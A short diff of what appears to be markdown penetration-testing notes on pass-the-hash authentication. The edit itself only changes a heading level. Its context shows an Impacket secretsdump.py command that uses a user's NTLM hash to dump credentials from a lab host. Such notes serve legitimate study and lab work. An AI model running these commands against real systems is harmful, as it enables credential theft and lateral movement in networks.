@@ -13,7 +13,7 @@ weight : 60
 
 Use the hash of a user to authenticate around the network.
 
-### Secretsdump.py
+## Secretsdump.py
 
 ```plain
 secretsdump.py offsec/Taskscheduler -hashes 4aed682cfe9b5ccf87903c166d11d7afMZWA 10.10.10.10
